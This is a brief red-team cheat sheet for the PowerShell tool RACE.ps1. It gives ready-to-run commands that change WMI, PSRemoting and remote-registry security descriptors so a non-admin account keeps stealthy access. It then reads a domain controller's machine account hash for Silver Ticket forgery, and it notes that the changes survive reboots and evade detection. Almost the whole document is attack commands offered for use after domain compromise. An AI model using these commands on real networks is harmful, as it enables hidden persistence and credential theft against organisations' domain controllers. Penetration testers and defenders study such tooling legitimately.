# Security Descriptor Backdoor (RACE.ps1)

Modify security descriptors on WMI, PSRemoting, and remote registry to allow non-admin access as a persistence mechanism.

## Setup
```powershell
. C:\Tools\RACE.ps1
```

## Grant WMI Access (non-admin)
```powershell
Set-RemoteWMI -SamAccountName <username> -ComputerName <TARGET> -Credential $creds -Namespace 'root\cimv2' -Verbose
```
Allows remote WMI queries without admin rights.

## Grant PSRemoting Access
```powershell
Set-RemotePSRemoting -SamAccountName <username> -ComputerName <TARGET> -Credential $creds -Verbose
```

## Add Remote Registry Backdoor
```powershell
Add-RemoteRegBackdoor -ComputerName <DC> -Trustee <username> -Verbose
```
Allows reading machine account hash via remote registry without DA.

## Get Machine Account Hash via Backdoor
```powershell
Get-RemoteMachineAccountHash -ComputerName <DC> -Verbose
```
Returns the DC machine account hash — can be used for Silver Ticket.

## Notes
- Security descriptor changes survive reboots
- Hard to detect without specific ACL auditing
- Useful post-DA for maintaining stealth access
